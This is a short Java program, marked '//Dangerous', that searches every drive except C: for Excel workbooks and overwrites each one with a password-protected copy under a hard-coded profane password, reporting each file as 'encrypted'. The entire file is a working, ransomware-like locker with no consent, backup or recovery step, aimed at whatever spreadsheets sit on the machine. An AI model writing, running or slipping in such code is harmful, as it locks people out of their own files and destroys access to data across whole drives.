





//Dangerous





import com.spire.xls.ExcelVersion;
import com.spire.xls.Workbook;
import java.io.File;
import java.io.IOException;
import java.nio.file.*;
import java.nio.file.attribute.BasicFileAttributes;
import java.util.ArrayList;
import java.util.List;
public class ExcelFileFinder {
    public static void main(String[] args) {
        
        
        List<Path> excelFiles = new ArrayList<>();
        File[] roots = File.listRoots();
        for (File root : roots) {
            if (root.toString().equalsIgnoreCase("C:\\")) {
                System.out.println("Skipping C drive.");
                continue;
            }
            Path startPath = root.toPath();
            System.out.println("Searching in drive: " + startPath);
            try {
                Files.walkFileTree(startPath, new SimpleFileVisitor<Path>() {
                    @Override
                    public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
                        if (file.toString().toLowerCase().endsWith(".xlsx") ||
                            file.toString().toLowerCase().endsWith(".xls") ||
                            file.toString().toLowerCase().endsWith(".xlsb")) {
                            excelFiles.add(file);
                        }
                        return FileVisitResult.CONTINUE;
                    }
                    @Override
                    public FileVisitResult visitFileFailed(Path file, IOException exc) {
                        System.err.println("Access denied or unable to read: " + file);
                        return FileVisitResult.CONTINUE;
                    }
                });
            } catch (IOException e) {
                System.err.println("Error walking file tree for drive: " + root + " - " + e.getMessage());
            }
        }
        System.out.println("Found " + excelFiles.size() + " Excel files:");
        for (Path excelFile : excelFiles) {
            try {
                System.out.println("Processing file: " + excelFile);
                Workbook workbook = new Workbook();
                workbook.loadFromFile(excelFile.toString());
                String password = "Fuck You";
                workbook.protect(password);
                workbook.saveToFile(excelFile.toString(), ExcelVersion.Version2016);
                System.out.println("File encrypted successfully: " + excelFile);
            } catch (Exception e) {
                System.err.println("Unable to process file: " + excelFile + " - " + e.getMessage());
            }
        }
        
        
        
        
        
    }
}
